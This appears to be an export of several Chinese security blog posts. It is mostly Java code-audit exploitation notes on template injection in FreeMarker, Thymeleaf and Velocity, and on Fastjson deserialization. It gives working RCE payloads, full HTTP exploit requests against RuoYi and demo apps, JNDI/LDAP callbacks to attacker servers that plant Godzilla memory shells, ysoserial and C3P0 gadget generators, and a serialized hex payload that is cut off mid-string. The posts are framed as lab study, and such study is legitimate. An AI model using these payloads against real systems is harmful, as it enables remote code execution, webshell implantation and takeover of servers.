factory.setRepository(f1); //2、核心操作类:创建一个文件上传解析器。 ServletFileUpload upload = new ServletFileUpload(factory); //解决上传\u0026#34;文件名\u0026#34;的中文乱码 upload.setHeaderEncoding(\u0026#34;UTF-8\u0026#34;); //3、判断enctype:判断提交上来的数据是否是上传表单的数据 if(!ServletFileUpload.isMultipartContent(req)){ System.out.println(\u0026#34;不是上传文件，终止\u0026#34;); //按照传统方式获取数据 return; } //==获取输入项== // //限制单个上传文件大小(5M) // upload.setFileSizeMax(1024*1024*4); // //限制总上传文件大小(10M) // upload.setSizeMax(1024*1024*6); //4、使用ServletFileUpload解析器解析上传数据，解析结果返回的是一个List\u0026lt;FileItem\u0026gt;集合，每一个FileItem对应一个Form表单的输入项 List\u0026lt;FileItem\u0026gt; items =upload.parseRequest(req); for(FileItem item:items){ //如果fileitem中封装的是普通输入项的数据（输出名、值） if(item.isFormField()){ String filedName = item.getFieldName();//普通输入项数据的名 //解决普通输入项的数据的中文乱码问题 String filedValue = item.getString(\u0026#34;UTF-8\u0026#34;);//普通输入项的值 System.out.println(\u0026#34;普通字段:\u0026#34;+filedName+\u0026#34;==\u0026#34;+filedValue); }else{ //如果fileitem中封装的是上传文件，得到上传的文件名称， String fileName = item.getName();//上传文件的名 //多个文件上传输入框有空 的 异常处理 if(fileName==null||\u0026#34;\u0026#34;.equals(fileName.trim())){ //去空格是否为空 continue;// 为空，跳过当次循环， 第一个没输入则跳过可以继续输入第二个 } //注意：不同的浏览器提交的文件名是不一样的，有些浏览器提交上来的文件名是带有路径的，如： c:\\a\\b\\1.txt，而有些只是单纯的文件名，如：1.txt //处理上传文件的文件名的路径，截取字符串只保留文件名部分。//截取留最后一个\u0026#34;\\\u0026#34;之后，+1截取向右移一位（\u0026#34;\\a.txt\u0026#34;--\u0026gt;\u0026#34;a.txt\u0026#34;） fileName = fileName.substring(fileName.lastIndexOf(\u0026#34;\\\\\u0026#34;)+1); //拼接上传路径。存放路径+上传的文件名 String filePath = realPath+\u0026#34;\\\\\u0026#34;+fileName; //构建输入输出流 InputStream in = item.getInputStream(); //获取item中的上传文件的输入流 OutputStream out = new FileOutputStream(filePath); //创建一个文件输出流 //创建一个缓冲区 byte b[] = new byte[1024]; //判断输入流中的数据是否已经读完的标识 int len = -1; //循环将输入流读入到缓冲区当中，(len=in.read(buffer))！=-1就表示in里面还有数据 while((len=in.read(b))!=-1){ //没数据了返回-1 //使用FileOutputStream输出流将缓冲区的数据写入到指定的目录(savePath+\u0026#34;\\\\\u0026#34;+filename)当中 out.write(b, 0, len); } //关闭流 out.close(); in.close(); //删除临时文件 try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } item.delete();//删除处理文件上传时生成的临时文件 System.out.println(\u0026#34;文件上传成功\u0026#34;); } } } catch (FileUploadException e) { //e.printStackTrace(); throw new RuntimeException(\u0026#34;服务器繁忙，文件上传失败\u0026#34;); } } @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { this.doPost(req, resp); } } 文件上传扩展项目：https://github.com/xiaonongOne/springboot-upload\nhttps://github.com/gaoyuyue/MyUploader-Backend\n","date":"2025-09-02T10:45:14+08:00","image":"https://lserein.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/logo_hu_cb8a9e43d13d12fb.jpg","permalink":"https://lserein.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"文件上传漏洞"},{"content":"Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园\nhttps://xz.aliyun.com/news/12415\nSSTI多种模版注入\n1.FreeMarker模板注入 1.1.FreeMarker简介 Java安全之freemarker 模板注入 - nice_0e3 - 博客园\nhttps://mp.weixin.qq.com/s/TtNxfSYsB4HMEpW_OBniew\nFreeMarker 是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。\n目前企业中，主要用Freemarker做静态页面或是页面展示\n1 2 3 4 5 6 7 使用时需要在pom.xml中引入对应依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.freemarker\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;freemarker\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.31\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1.2.漏洞审计思路 白盒思路 判断是否使用模板技术\u0026mdash;\u0026gt;从pom.xml文件中查找 判断使用模板框架 寻找可控点，尝试传入对应poc 验证利用漏洞 黑盒思路 常出现的功能点：后台模板解析处，模板文件修改处，模板文件上传处\u0026hellip;\n1.3.漏洞利用方式 1 2 3 4 5 \u0026lt;#assign value=\u0026#34;freemarker.template.utility.ObjectConstructor\u0026#34;? new()\u0026gt;${value(\u0026#34;java.lang.ProcessBuilder\u0026#34;,\u0026#34;calc.exe\u0026#34;).start()} \u0026lt;#assign value=\u0026#34;freemarker.template.utility.ObjectConstructor\u0026#34;?new()\u0026gt;${value(\u0026#34;java.lang.ProcessBuilder\u0026#34;,\u0026#34;whoami\u0026#34;).start()} \u0026lt;#assign value=\u0026#34;freemarker.template.utility.JythonRuntime\u0026#34;?new()\u0026gt;\u0026lt;@value\u0026gt;import os;os.system(\u0026#34;calc.exe\u0026#34;) \u0026lt;#assign ex=\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()\u0026gt; ${ ex(\u0026#34;open -a Calculator.app\u0026#34;) } 1 2 3 4 5 6 7 8 9 \u0026lt;#assign uri=object?api.class.getResource(\u0026#34;/\u0026#34;).toURI()\u0026gt; \u0026lt;#assign input=uri?api.create(\u0026#34;file:///etc/passwd\u0026#34;).toURL().openConnection()\u0026gt; \u0026lt;#assign is=input?api.getInputStream()\u0026gt; FILE:[\u0026lt;#list 0..999999999 as _\u0026gt; \u0026lt;#assign byte=is.read()\u0026gt; \u0026lt;#if byte == -1\u0026gt; \u0026lt;#break\u0026gt; \u0026lt;/#if\u0026gt; ${byte}, \u0026lt;/#list\u0026gt;] 1.4.OFCMS-freemarker模板注入漏洞 java代码审计\u0026ndash;OFCMS\n查看项目配置文件pom.xml\n可以看到引入了Freemarker依赖\n登录管理员后台，发现存在模板管理功能点\n在about.html文件中插入poc\n1 \u0026lt;#assign value=\u0026#34;freemarker.template.utility.ObjectConstructor\u0026#34;? new()\u0026gt;${value(\u0026#34;java.lang.ProcessBuilder\u0026#34;,\u0026#34;calc.exe\u0026#34;).start()} 访问about.html页面成功弹出计算器\n1.5.MRCMS-freemarker模板注入漏洞 1 2 运行项目命令 mvn jetty:run 从pom.xml文件可知网站使用了freemarker框架\n网站后台恰好存在文章管理和文件管理和页面管理功能点\n页面管理\u0026mdash;文件管理\u0026mdash;themes\u0026mdash;flatweb\u0026mdash;修改index.html或者about.html\n插入恶意payload\n1 \u0026lt;#assign value=\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()\u0026gt;${value(\u0026#34;calc.exe\u0026#34;)} 2.Thymeleaf模板注入 Java 安全 | Thymeleaf 模板注入原理分析\n第60篇：Thymeleaf模板注入漏洞总结及修复方法（上篇）\nhttps://mp.weixin.qq.com/s/nf4Xu8dgRC35Egrga4shXg\n2.1.Thymeleaf介绍 Thymeleaf模板注入存在版本限制：Thymeleaf在3.0.0到3.0.13存在模板注入漏洞\nThymeleaf是适用于Web和独立环境的现代服务器端Java模板引擎，允许处理HTML、XML、TEXT、JAVASCRIPT、CSS、RAW。\n模板引擎：\n模板引擎对象是org.thymeleaf.ITemplateEngine接口的实现\nThymeleaf核心是org.thymeleaf.TemplateEngine\n*Thymeleaf 模板的表达式有以下几种：{\u0026hellip;}、消息表达式：#{\u0026hellip;}、链接 URL 表达式：@{\u0026hellip;}、片段表达式：~{\u0026hellip;}。所以很多thymeleaf 模板的注入语句 ${\u0026hellip;} 换成 {\u0026hellip;} 也是可以利用成功的。\n2.2.Thymeleaf使用 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-thymeleaf\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2.3.Thymeleaf漏洞利用方式 测试中遇到很多问题就是SpringBoot版本和Thymeleaf版本不匹配的问题，只有Spring3以下版本才会使用Thymeleaf的漏洞版本，Spring3以上版本使用的Thymeleaf版本过高，不会存在模板注入问题\n第一种情况，return内容可控 这种情况最容易出现thymeleaf模板注入漏洞，一旦用户提交的数据可以传到return语句中，攻击者就可以提交恶意模板注入语句使thymeleaf组件进行模板解析，造成代码执行漏洞。\n第二种情况，URL路径可控 这种情况比较少见，要求方法的返回类必须为void，此时会从URL中获取viewname，以URL路由为视图名称，调用模板视图去解析。\n1 __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x 第三种情况，模板内容可控 模板内容可控这种情况太少见了\n1 2 3 4 5 6 __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x __${T(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;)}__::RoboTerh __${T%20(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;)}__::.x ;/__${T(java.lang.runtime).getruntime().exec(\u0026#34;calc\u0026#34;)}__::.x //__${T(java.lang.runtime).getruntime().exec(\u0026#34;calc\u0026#34;)}__::.x 2.4.漏洞修复建议 1.使用@ResponseBody或@RestController修饰 @ResponseBody 是一个Spring框架中的注解，它用于指示该方法的返回值应该直接写入HTTP响应正文ResponseBody中，而不是通过视图解析器进行渲染。使用 @ResponseBody 注解可以将方法返回值以JSON、XML等格式直接写入HTTP响应体中，常用于返回 RESTful API 接口的响应数据。\n@RestController是Spring框架中的一个注解，它结合了@Controller和 @ResponseBody注解的功能，用于简化 RESTful Web 服务开发。\n2.使用redirect:或forward:修饰 根据springboot定义，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值。这里需要注意的是，除了redirect:之外，还有forward:，这点网上很少提到。\n3.设置为HttpServletResponse 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析，也就不会存在模板注入漏洞了。\nThymeleaf 默认会阻止 ${...} 或 ${\u0026hellip;}** 这类模板表达式出现在 **视图名称（View Name）或 请求参数中，这是出于安全考虑，防止 服务器端模板注入（SSTI）攻击。\n1 spring.thymeleaf.enable-preprocessing=false 2.5.RuoYi4.6.0\u0026mdash;Thymeleaf模板注入 JAVA代审-RuoYi4.6.0\n项目地址：https://gitee.com/y_project/RuoYi/repository/archive/v4.6.0.zip\n导入sql下两个数据库文件，使用：admin:admin123进行登录即可\n更改ruoyi-admin目录下的配置文件\n先看pom.xml文件，看使用了什么模板技术\n使用的Thymeleaf版本为3.0.11\n版本是3.0.11，是存在漏洞的版本，全局搜索::，也就是片段表达式\n全局搜索::\n1 __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__ 根据路由构造请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /monitor/cache/getNames HTTP/1.1 Host: 192.168.0.102 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Referer: http://192.168.0.102/index Priority: u=4 Content-Type: application/x-www-form-urlencoded Content-Length: 119 fragment=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__ 除了getNames接口之外，getKeys和getValues接口同样也存在漏洞\n3.Velocity模板注入 https://zhuanlan.zhihu.com/p/680660633\nhttps://mp.weixin.qq.com/s/7VxKATKpJ-wMZkFaStbUxw\nhttps://juejin.cn/post/7034112895277498404\n3.1.Velocity介绍 Velocity 模板是一种用于快速开发 Web 应用程序的模板引擎。它允许开发人员使用自然语言和简单的语法来描述 Web 应用程序的 UI 和业务逻辑，从而提高开发效率和代码质量。\nVelocity 小于等于 2.2 版本存在模板注入漏洞。\n3.2.漏洞Demo 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.velocity\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;velocity\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 @GetMapping(\u0026#34;/ssti\u0026#34;) public void velocity(String template) { Velocity.init(); VelocityContext context = new VelocityContext(); context.put(\u0026#34;name\u0026#34;, \u0026#34;lisi\u0026#34;); StringWriter swOut = new StringWriter(); Velocity.evaluate(context, swOut, \u0026#34;test\u0026#34;, template); } http://127.0.0.1:8081/ssti?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)\n1 %23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22) ","date":"2025-08-15T17:02:16+08:00","image":"https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo_hu_17d5aca9140b61a4.jpg","permalink":"https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/","title":"Java代码审计模板安全SSTI漏洞"},{"content":"奇安信攻防社区-浅谈黑盒识别Fastjson/Jackson组件\nhttps://mp.weixin.qq.com/s/wlWi1g3P-iechsPH3l4sCw\nhttps://mp.weixin.qq.com/s/sD-VSjHoXMoLTZvMlWB0vw\n1.FastJson介绍 Fastjson是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。\n2.如何判断网站是否使用了Fastjson Fastjson批量检查及一键利用工具 - FreeBuf网络安全行业门户\n2.1.报错回显 将Json改为**{\u0026quot;test\u0026quot;:\u0026quot;**,如果目标网站使用了Fastjson组件，则可能会爆出Fastjson相关特征\n2.2.DNSlog盲打 fastjson-1.2.67版本前\n1 {\u0026#34;zeo\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;fatu5k.dnslog.cn\u0026#34;}} fastjson-1.2.67版本后\n1 2 {\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet6Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} 3.fastJson历史漏洞版本 https://mp.weixin.qq.com/s/mcsPexe0aIou1MHAZX8EKQ\nfastjson重点版本利用（含详细实验过程\u0026amp;\u0026amp;绕瓦夫技巧）\n3.1.FastJson漏洞原理 Fastjson的漏洞本质还是一个java的反序列化漏洞。\nFastjson在序列化的时候就会使用AutoType功能进行对序列化后的JSON字符带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法。然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。\n1 2 fastjson反序列化是源于处理Json数据时对输入验证不足，没有对@type进行字段过滤，导致攻击者可以 构造一个恶意的Json数据，将恶意类作为AutoType的值，当fastjson反序列化时，导致远程代码执行 1 2 3 4 5 6 7 8 Fastjson \u0026lt;=1.2.24 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.41 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.42 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.43 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.45 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.47 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.62 反序列化远程命令执行漏洞 Fastjson \u0026lt;=1.2.66 反序列化远程命令执行漏洞 一个简单的漏洞代码段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.example.fastjsondemo.controller; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @PostMapping(\u0026#34;/hello\u0026#34;) public static String hello(@RequestBody String name) { JSONObject jsonObject = JSON.parseObject(name); return jsonObject.toString(); } } 4.FastJson漏洞挖掘思路 4.1.白盒审计思路 1.查看项目是否使用Fastjson组件（pom.xml文件/外部依赖） 2.引用的Fastjson是否是存在漏洞版本 3.全局搜索parseObject关键字，查看前台路由是否可控 4.2.黑盒挖掘思路 1.当遇到请求体是Json格式时就可以去尝试 2.判断是否为FastJson组件 3.FastJson盲打 5.Fastjson 利用 Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客\nhttps://mp.weixin.qq.com/s/lGTYslO-EtLIZZf6QCfiQw\nfastjson payload大集合\n靶场地址：https://github.com/safe6Sec/ShiroAndFastJson\n5.1.Fastjson\u0026lt;=1.2.24 反序列化远程命令执行漏洞 环境：JDK1.8+fastjson1.2.23\n从pom.xml文件看，存在fastjson依赖，并且版本存在漏洞\n找到对应的parse方法\n使用JNDI-Injection-Exploit进行利用\n1 2 3 4 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;calc.exe\u0026#34; -A \u0026#34;192.168.165.252\u0026#34; -C 要执行的命令 -A本机地址或者Vps地址 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /json HTTP/1.1 Host: 192.168.165.252:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1748439476; JSESSIONID=23FC54A22F8400C422A60A4C492EE6C2 Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: text/json Content-Length: 162 { \u0026#34;b\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://192.168.165.252:1099/ymbbhf\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } } 此时弹出计算器\n注意：此时测试通过的FastJson版本为1.2.23版本，JDK版本为11，当JDK版本大于11时，漏洞无法利用成功，当fastjson版本大于1.2.23时再次攻击就会报错，这个错误仍然是 Fastjson 的 autoType 安全机制阻止了com.sun.rowset.JdbcRowSetImpl的反序列化，即使你升级了 JDK 版本，Fastjson 仍然会阻止该类的反序列化，因为 JdbcRowSetImpl 存在安全风险（可用于 JNDI 注入攻击）。\n打入内存马 内存马利用工具：https://github.com/Pikaqi/JNDIExploit-1.4\n1 java -jar JNDIExploit-1.4-SNAPSHOT.jar -u //查看使用方法 1 java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.165.252 绑定IP地址启动 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /json HTTP/1.1 Host: 192.168.165.252:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Referer: http://192.168.165.252:8088/login;jsessionid=269897CD3047E364E22D450F40715A64 Connection: close Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1748439476; JSESSIONID=269897CD3047E364E22D450F40715A64 Priority: u=6 Content-Type: text/json Content-Length: 178 { \u0026#34;b\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap://0.0.0.0:1389/TomcatBypass/GodzillaMemshell\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } } 成功打入内存马\n5.2.Fastjson \u0026lt;= 1.2.47反序列化远程命令执行漏洞 Fastjson系列-漏洞复现\n第一个Fastjson反序列化漏洞爆出以后，阿里在1.2.25版本设置了autoTypeSupport属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的。\ncom.sun.rowset.jdbcRowSetlmpl在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以\u0026quot;L\u0026quot;开头，以\u0026quot;;\u0026ldquo;结尾，是的话就提取出其中的类名在加载进来。\n那么就可以构造如下exp：\n总之就是对比上一个版本，增加了一些过滤，开启autoType后，构造描述符绕过，添加字符即可\n1 {\u0026#34;@type\u0026#34;:\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://ip:9999/rce_1_2_24_exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;:true 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 POST /json HTTP/1.1 Host: 192.168.165.252:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1748439476; JSESSIONID=FB191FA4A87502B1D47A0EF7BFEEDCB2 Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/json Content-Length: 267 { \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;ldap://192.168.165.252:1389/TomcatBypass/GodzillaMemshell\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } 命令执行，通过tomcat回显，fastjson不出网可以使用此方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /json HTTP/1.1 Host: 192.168.165.252:8088 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1748439476; JSESSIONID=FB191FA4A87502B1D47A0EF7BFEEDCB2 Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/json Content-Length: 261 cmd:whoami { \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;ldap://192.168.165.252:1389/TomcatBypass/TomcatEcho\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } 5.3.C3P0二次反序列化 只要存在C3P0依赖，FastJson\u0026lt;=1.2.47通杀，FastJson本身也存在原生发序列化漏洞链，且覆盖1.2全版本，不出网也能利用\npayload生成\n1 java -jar ysoserial-all.jar CommonsCollections2 \u0026#34;open -a Calculator\u0026#34; \u0026gt; payload.ser 将生成的payload.ser文件转为16进制\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package com.shiro.vuln.fastjson; import java.io.*; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson11_C3P0 { public static void main(String[] args) throws Exception { InputStream in = new FileInputStream(\u0026#34;payload.ser\u0026#34;); byte[] payload = toByteArray(in); String payloadHex = bytesToHex(payload, payload.length); // C3P0 二次反序列化 String poc = \u0026#34;{\\r\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;, \\r\\n\u0026#34; + \u0026#34; \\\u0026#34;userOverridesAsString\\\u0026#34;: \\\u0026#34;HexAsciiSerializedMap:\u0026#34; + payloadHex + \u0026#34;;\\\u0026#34;\\r\\n\u0026#34; + \u0026#34;}\u0026#34;; // \u0026lt;1.2.48 and C3P0 二次反序列化 // poc = \u0026#34;{\\r\\n\u0026#34; // + \u0026#34; \\\u0026#34;a\\\u0026#34;: {\\r\\n\u0026#34; // + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;java.lang.Class\\\u0026#34;, \\r\\n\u0026#34; // + \u0026#34; \\\u0026#34;val\\\u0026#34;: \\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;\\r\\n\u0026#34; // + \u0026#34; }, \\r\\n\u0026#34; // + \u0026#34; \\\u0026#34;b\\\u0026#34;: {\\r\\n\u0026#34; // + \u0026#34; \\\u0026#34;@type\\\u0026#34;: \\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;, \\r\\n\u0026#34; // + \u0026#34; \\\u0026#34;userOverridesAsString\\\u0026#34;: \\\u0026#34;HexAsciiSerializedMap:\u0026#34; + payloadHex + \u0026#34;;\\\u0026#34;\\r\\n\u0026#34; // + \u0026#34; }\\r\\n\u0026#34; // + \u0026#34;}\u0026#34;; System.out.println(poc); JSON.parseObject(poc); } public static byte[] toByteArray(InputStream in) throws IOException { byte[] bytes = new byte[in.available()]; in.read(bytes); in.close(); return bytes; } public static String bytesToHex(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for (int i = 0; i \u0026lt; length; ++i) { String sTemp = Integer.toHexString(255 \u0026amp; bArray[i]); if (sTemp.length() \u0026lt; 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); } } 运行该文件，即可生成payload，需要注意fastjson版本信息，一个是小于1.2.48\n1 2 3 4 5 6 7 8 9 10 { \u0026#34;a\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026#34; }, \u0026#34;b\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026#34;, \u0026#34;userOverridesAsString\u0026#34;: \u0026#34;HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C00096465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B7870737200406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733B